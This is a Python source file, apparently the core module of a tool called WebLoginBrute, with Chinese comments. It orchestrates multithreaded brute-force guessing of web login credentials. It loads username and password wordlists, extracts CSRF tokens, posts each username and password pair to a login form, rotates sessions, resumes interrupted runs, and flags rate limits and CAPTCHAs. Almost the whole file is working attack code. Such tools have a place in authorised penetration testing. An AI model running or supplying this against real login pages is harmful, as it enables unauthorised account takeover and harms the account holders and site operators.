#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import logging
import signal
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Event
from typing import List, Optional

from .config import Config
from .exceptions import (
    RateLimitError,
    MemoryError,
    HealthCheckError,
    ConfigurationError,
)
from .http_client import HttpClient
from .logger import setup_logging
from .parsers import analyze_form_fields, contains_captcha, extract_token
from .reporting import StatsManager
from .state import StateManager
from .wordlists import load_wordlist_as_list
from .memory_manager import get_memory_manager, MemoryConfig
from .session_manager import get_session_rotator, SessionConfig
from .health_check import get_health_checker, run_health_checks


class WebLoginBrute:
    """
    核心流程调度类，负责整体爆破流程的编排与异常处理。
    增强功能包括：系统健康检查、性能监控、错误诊断等。
    """

    def __init__(self, config: Config) -> None:
        """
        初始化核心对象和配置。
        构造函数应保持轻量，只进行必要的属性赋值和对象创建。
        """
        if not all([config.url, config.action, config.users, config.passwords]):
            raise ValueError("核心配置参数不能为空")

        self.config = config
        setup_logging(config.verbose)

        # 基于主配置创建模块化配置
        memory_config = MemoryConfig(
            max_memory_mb=self.config.max_memory_mb,
            warning_threshold=self.config.memory_warning_threshold / 100.0,
            critical_threshold=self.config.memory_critical_threshold / 100.0,
            cleanup_interval=self.config.memory_cleanup_interval,
        )
        session_config = SessionConfig(
            rotation_interval=self.config.session_rotation_interval,
            session_lifetime=self.config.session_lifetime,
            max_session_pool_size=self.config.max_session_pool_size,
            enable_rotation=self.config.enable_session_rotation,
            rotation_strategy=self.config.rotation_strategy,
        )

        # 初始化核心组件
        self.memory_manager = get_memory_manager()
        self.memory_manager.config = memory_config

        self.session_rotator = get_session_rotator()
        self.session_rotator.config = session_config

        self.http = HttpClient(config)
        self.state = StateManager(config)
        self.stats = StatsManager()
        self.health_checker = get_health_checker(config)

        # 内部状态控制
        self.success = Event()
        self.executor: Optional[ThreadPoolExecutor] = None
        self._shutdown_requested = False

        # 注册信号处理器，确保能优雅关闭
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)

    def setup(self):
        """
        设置和启动监控、回调等运行时组件。
        此方法在 `run` 的开始阶段被调用。
        """
        logging.info("正在设置运行时组件...")
        self.memory_manager.start_monitoring()
        self.memory_manager.add_cleanup_callback(self._on_memory_cleanup)
        self._register_health_check_callbacks()

    def _signal_handler(self, signum, frame):
        """处理中断信号"""
        logging.info(f"收到信号 {signum}，正在优雅关闭...")
        self._shutdown_requested = True
        self.success.set()
        if self.executor:
            self.executor.shutdown(wait=False)
            self.executor = None

    def _on_memory_cleanup(self, cleanup_type: str):
        """内存清理回调"""
        if cleanup_type == "emergency":
            logging.warning("执行紧急内存清理，暂停任务执行")
            # 暂停任务执行
            if self.executor:
                self.executor.shutdown(wait=False)
                self.executor = None
        else:
            logging.debug("执行正常内存清理")

    def _register_health_check_callbacks(self):
        """注册健康检查回调函数"""
        # 内存使用回调
        self.health_checker.register_check_callback(
            "memory_usage", self._on_memory_health_check
        )

        # 系统资源回调
        self.health_checker.register_check_callback(
            "system_resources", self._on_system_health_check
        )

        # 网络性能回调
        self.health_checker.register_check_callback(
            "network_performance", self._on_network_health_check
        )

    def _on_memory_health_check(self, result):
        """内存健康检查回调"""
        if result.status == "FAIL":
            logging.critical(f"内存健康检查失败: {result.message}")
            # 触发紧急内存清理
            self.memory_manager._emergency_cleanup()
        elif result.status == "WARNING":
            logging.warning(f"内存健康检查警告: {result.message}")

    def _on_system_health_check(self, result):
        """系统资源健康检查回调"""
        if result.status == "FAIL":
            logging.critical(f"系统资源健康检查失败: {result.message}")
            # 可以考虑降低并发数或暂停任务
        elif result.status == "WARNING":
            logging.warning(f"系统资源健康检查警告: {result.message}")

    def _on_network_health_check(self, result):
        """网络性能健康检查回调"""
        if result.status == "FAIL":
            logging.critical(f"网络性能健康检查失败: {result.message}")
            # 可以考虑增加重试次数或降低请求频率
        elif result.status == "WARNING":
            logging.warning(f"网络性能健康检查警告: {result.message}")

    def run(self) -> None:
        """主运行方法"""
        logging.info("开始WebLoginBrute主流程...")

        try:
            # 启动运行时组件
            self.setup()

            # 执行初始健康检查
            if self.config.enable_health_check:
                self._perform_initial_health_check()

            self._initialize_components()
            self._load_wordlists()
            self._setup_executor()
            self._execute_brute_force()
        except KeyboardInterrupt:
            self._handle_interruption()
        except MemoryError as e:
            logging.error(f"内存不足: {e}")
            self._handle_memory_error(e)
        except HealthCheckError as e:
            logging.error(f"健康检查失败: {e}")
            self._handle_health_check_error(e)
        except Exception as e:
            self._handle_error(e)
        finally:
            self._cleanup_resources()

    def _perform_initial_health_check(self):
        """执行初始健康检查"""
        logging.info("执行初始系统健康检查...")

        try:
            results = run_health_checks(self.config)

            # 分析检查结果
            fail_count = sum(1 for r in results if r.status == "FAIL")
            warning_count = sum(1 for r in results if r.status == "WARNING")

            if fail_count > 0:
                logging.error(f"初始健康检查发现 {fail_count} 个失败项")
                for result in results:
                    if result.status == "FAIL":
                        logging.error(f"  - {result.check_name}: {result.message}")

                # 根据配置决定是否继续
                if self.config.security_level in ["high", "paranoid"]:
                    raise HealthCheckError("初始健康检查失败，安全级别要求停止执行")
                else:
                    logging.warning("健康检查失败，但将继续执行（安全级别允许）")

            if warning_count > 0:
                logging.warning(f"初始健康检查发现 {warning_count} 个警告项")
                for result in results:
                    if result.status == "WARNING":
                        logging.warning(f"  - {result.check_name}: {result.message}")

            if fail_count == 0 and warning_count == 0:
                logging.info("初始健康检查通过，所有检查项正常")

            # 打印检查摘要
            self._print_health_check_summary(results)

        except Exception as e:
            logging.error(f"初始健康检查执行失败: {e}")
            if self.config.security_level == "paranoid":
                raise HealthCheckError(f"偏执模式下健康检查失败: {e}")

    def _print_health_check_summary(self, results):
        """打印健康检查摘要"""
        if not results:
            return

        print("\n" + "=" * 60)
        print("                   系统健康检查摘要")
        print("=" * 60)

        # 按状态分组
        status_groups = {}
        for result in results:
            if result.status not in status_groups:
                status_groups[result.status] = []
            status_groups[result.status].append(result)

        # 打印各状态的结果
        for status in ["PASS", "WARNING", "FAIL"]:
            if status in status_groups:
                print(f"\n{status} 状态 ({len(status_groups[status])} 项):")
                for result in status_groups[status]:
                    icon = (
                        "✅"
                        if status == "PASS"
                        else "⚠️" if status == "WARNING" else "❌"
                    )
                    print(f"  {icon} {result.check_name}: {result.message}")
                    if result.details:
                        for key, value in result.details.items():
                            if key != "error":
                                print(f"      {key}: {value}")

        print("=" * 60)

    def _initialize_components(self):
        """初始化组件"""
        self.http.pre_resolve_targets([self.config.url, self.config.action])
        logging.info("组件初始化完成。")

    def _load_wordlists(self):
        """加载用户和密码字典"""
        logging.info("正在加载字典文件...")
        try:
            # 使用关键字参数，避免 linter 误报
            self.users = load_wordlist_as_list(path=self.config.users, config=self.config)
            self.passwords = load_wordlist_as_list(
                path=self.config.passwords, config=self.config
            )
            logging.info(
                f"成功加载 {len(self.users)} 个用户名和 {len(self.passwords)} 个密码。"
            )
        except (FileNotFoundError, ValueError, MemoryError) as e:
            raise ConfigurationError(f"加载字典失败: {e}") from e

    def _setup_executor(self):
        """设置线程池"""
        self.executor = ThreadPoolExecutor(
            max_workers=self.config.threads, thread_name_prefix="WebLoginBrute"
        )
        self.stats.stats["start_time"] = time.time()
        logging.info("线程池设置完成")

    def _execute_brute_force(self):
        """执行暴力破解"""
        self._brute_force(self.users, self.passwords)

    def _handle_interruption(self):
        """处理用户中断"""
        logging.info("用户中断操作，保存进度...")
        self.state.save_progress(self.stats.get_stats())

    def _handle_memory_error(self, error: MemoryError):
        """处理内存错误"""
        logging.error(f"内存不足: {error}")
        logging.info("尝试释放内存并保存进度...")

        # 强制垃圾回收
        import gc

        gc.collect()

        # 保存进度
        self.state.save_progress(self.stats.get_stats())

        # 建议用户减少并发数或字典大小
        logging.info("建议: 减少并发线程数或使用更小的字典文件")

    def _handle_health_check_error(self, error: HealthCheckError):
        """处理健康检查错误"""
        logging.error(f"健康检查失败: {error}")

        # 保存进度
        self.state.save_progress(self.stats.get_stats())

        # 导出健康检查报告
        try:
            report_path = f"health_check_report_{int(time.time())}.json"
            self.health_checker.export_report(report_path)
            logging.info(f"健康检查报告已导出到: {report_path}")
        except Exception as e:
            logging.error(f"导出健康检查报告失败: {e}")

    def _handle_error(self, error):
        """处理运行错误"""
        logging.error(f"运行过程中发生错误: {error}")
        self.state.save_progress(self.stats.get_stats())

    def _cleanup_resources(self):
        """清理资源"""
        # 确保线程池正确关闭
        if self.executor:
            try:
                # 先取消所有未完成的任务
                self.executor.shutdown(wait=False, cancel_futures=True)
                logging.debug("线程池已关闭，所有未完成任务已取消")
            except Exception as e:
                logging.warning(f"关闭线程池时发生错误: {e}")
            finally:
                self.executor = None

        # 停止内存监控
        self.memory_manager.stop_monitoring()

        # 执行最终健康检查
        if self.config.enable_health_check:
            self._perform_final_health_check()

        # 确保所有资源都被释放
        try:
            self.stats.stats["end_time"] = time.time()
            self.stats.finalize()
            self.stats.print_final_report()

            # 打印内存和会话统计
            self._print_resource_stats()

            if self.success.is_set():
                self.state.cleanup_progress_file()
            self.http.close_all_sessions()
        except Exception as e:
            logging.error(f"清理资源时发生错误: {e}")
        finally:
            logging.shutdown()

    def _perform_final_health_check(self):
        """执行最终健康检查"""
        logging.info("执行最终系统健康检查...")

        try:
            results = run_health_checks(self.config)

            # 分析最终结果
            fail_count = sum(1 for r in results if r.status == "FAIL")
            warning_count = sum(1 for r in results if r.status == "WARNING")

            if fail_count > 0 or warning_count > 0:
                logging.warning(
                    f"最终健康检查: {fail_count} 个失败项, {warning_count} 个警告项"
                )

                # 导出最终报告
                report_path = f"final_health_check_report_{int(time.time())}.json"
                self.health_checker.export_report(report_path)
                logging.info(f"最终健康检查报告已导出到: {report_path}")
            else:
                logging.info("最终健康检查通过，所有检查项正常")

        except Exception as e:
            logging.error(f"最终健康检查执行失败: {e}")

    def _print_resource_stats(self):
        """打印资源统计信息"""
        try:
            # 内存统计
            memory_stats = self.memory_manager.get_memory_stats()
            logging.info("内存使用统计:")
            logging.info(f"  峰值内存: {memory_stats['peak_memory_mb']:.1f}MB")
            logging.info(f"  清理次数: {memory_stats['cleanup_count']}")
            logging.info(f"  垃圾回收: {memory_stats['gc_count']}")

            # 会话统计
            session_stats = self.http.get_session_stats()
            logging.info("会话管理统计:")
            logging.info(f"  总会话数: {session_stats['total_sessions']}")
            logging.info(f"  总请求数: {session_stats['total_requests']}")
            logging.info(f"  平均错误率: {session_stats['avg_error_rate']:.2%}")
            logging.info(
                f"  会话轮换: {session_stats['rotation_stats']['total_rotations']}"
            )

            # 健康检查统计
            health_summary = self.health_checker.get_summary()
            logging.info("健康检查统计:")
            logging.info(f"  总检查次数: {health_summary['total_checks']}")
            logging.info(f"  状态分布: {health_summary['status_counts']}")

        except Exception as e:
            logging.warning(f"获取资源统计失败: {e}")

    def _brute_force(self, usernames: List[str], passwords: List[str]):
        """执行暴力破解"""
        total_combinations = len(usernames) * len(passwords)
        logging.info(f"开始暴力破解，总共 {total_combinations} 个组合")

        # 定期健康检查间隔
        health_check_interval = 1000  # 每1000次尝试检查一次
        last_health_check = 0

        try:
            futures = []
            for username in usernames:
                for password in passwords:
                    if self.success.is_set() or self._shutdown_requested:
                        break

                    # 检查是否已尝试过
                    if self.state.has_been_attempted((username, password)):
                        continue

                    # 提交任务
                    if self.executor:
                        future = self.executor.submit(
                            self._try_login, username, password
                        )
                        futures.append(future)

                    # 定期健康检查
                    if len(futures) - last_health_check >= health_check_interval:
                        if self.config.enable_health_check:
                            self._perform_periodic_health_check()
                        last_health_check = len(futures)

            # 等待所有任务完成
            for future in as_completed(futures):
                if self.success.is_set() or self._shutdown_requested:
                    break

                try:
                    result = future.result()
                    if result:
                        logging.info("发现有效凭据！")
                        self.success.set()
                        break
                except Exception as e:
                    logging.error(f"任务执行失败: {e}")

        except Exception as e:
            logging.error(f"暴力破解执行失败: {e}")
            raise

    def _perform_periodic_health_check(self):
        """执行定期健康检查"""
        try:
            results = run_health_checks(self.config)

            # 只记录失败和警告
            fail_results = [r for r in results if r.status == "FAIL"]
            warning_results = [r for r in results if r.status == "WARNING"]

            if fail_results:
                logging.warning(f"定期健康检查发现 {len(fail_results)} 个失败项")
                for result in fail_results:
                    logging.warning(f"  - {result.check_name}: {result.message}")

            if warning_results:
                logging.info(f"定期健康检查发现 {len(warning_results)} 个警告项")
                for result in warning_results:
                    logging.info(f"  - {result.check_name}: {result.message}")

        except Exception as e:
            logging.error(f"定期健康检查失败: {e}")

    def _try_login(self, username: str, password: str) -> bool:
        """
        尝试一次登录。
        在 dry_run 模式下，将跳过实际的网络请求。
        """
        if self.config.dry_run:
            logging.info(f"[DRY RUN] 模拟登录: 用户名='{username}', 密码='***'")
            # 使用正确的方法更新尝试次数
            self.stats.update_attempt(username, password="***")
            # 在 dry_run 模式下，我们无法判断是否成功，因此总是返回 False
            # 并短暂休眠以模拟网络延迟，避免CPU空转。
            time.sleep(0.05)
            return False

        if self.success.is_set():
            return False

        self.stats.update_attempt(username, password)

        try:
            resp = self._get_login_page(username, password)
            if not resp or not resp.text:
                self.stats.update("other_errors")
                return False
            token = self._extract_token(resp, username, password)
            data = self._build_login_data(username, password, token)
            resp2 = self.http.post(self.config.action, data=data)
            return self._handle_login_response(resp2, username, password)
        except RateLimitError as e:
            logging.error(f"频率限制错误: {e}")
            self.stats.update("rate_limit_errors")
            return False
        except MemoryError as e:
            logging.error(f"内存不足: {e}")
            # 内存不足时暂停任务
            time.sleep(5)
            return False
        except Exception as e:
            logging.error(f"未知错误: {e}")
            self.stats.update("other_errors")
            return False

    def _get_login_page(self, username, password):
        resp = self.http.get(self.config.url)
        analyze_form_fields(resp.text)
        return resp

    def _extract_token(self, resp, username, password):
        token = None
        if self.config.csrf:
            token = extract_token(
                resp.text, resp.headers.get("Content-Type", ""), self.config.csrf
            )
            if not token:
                logging.warning(
                    f"未能为 {username}:{password} 提取Token（如目标无CSRF token可忽略）"
                )
        return token

    def _build_login_data(
        self, username: str, password: str, token: Optional[str] = None
    ) -> dict:
        data = {"username": username, "password": password}
        if token and self.config.csrf:
            data[self.config.csrf] = token
        if self.config.login_field and self.config.login_value:
            data[self.config.login_field] = self.config.login_value
        return data

    def _handle_login_response(self, resp, username: str, password: str) -> bool:
        if self.success.is_set():
            return False

        self.stats.update("total_attempts")

        # 检查是否成功
        if self._check_login_success(resp):
            logging.info(f"SUCCESS: {username}:{password}")
            self.stats.update("successful_attempts")
            self.success.set()
            return True

        # 检查是否遇到频率限制
        if resp.status_code == 429:
            logging.warning(f"频率限制: {username}:{password}")
            self.stats.update("rate_limited")
            return False

        # 检查是否检测到验证码
        if contains_captcha(resp.text):
            logging.warning(f"检测到验证码: {username}:{password}")
            self.stats.update("captcha_detected")
            return False

        return False

    def _check_login_success(
        self, response, success_keywords=None, failure_keywords=None
    ) -> bool:
        """检查登录是否成功"""
        if not response or not hasattr(response, "text"):
            return False

        # 默认成功/失败关键词
        if success_keywords is None:
            success_keywords = [
                "welcome",
                "dashboard",
                "logout",
                "profile",
                "success",
                "登录成功",
            ]
        if failure_keywords is None:
            failure_keywords = [
                "invalid",
                "incorrect",
                "failed",
                "error",
                "login",
                "登录失败",
            ]

        response_lower = response.text.lower()

        # 计算成功和失败关键词的匹配数
        success_count = sum(
            1 for keyword in success_keywords if keyword.lower() in response_lower
        )
        failure_count = sum(
            1 for keyword in failure_keywords if keyword.lower() in response_lower
        )

        # 如果成功关键词匹配数大于失败关键词匹配数，则认为登录成功
        return success_count > failure_count
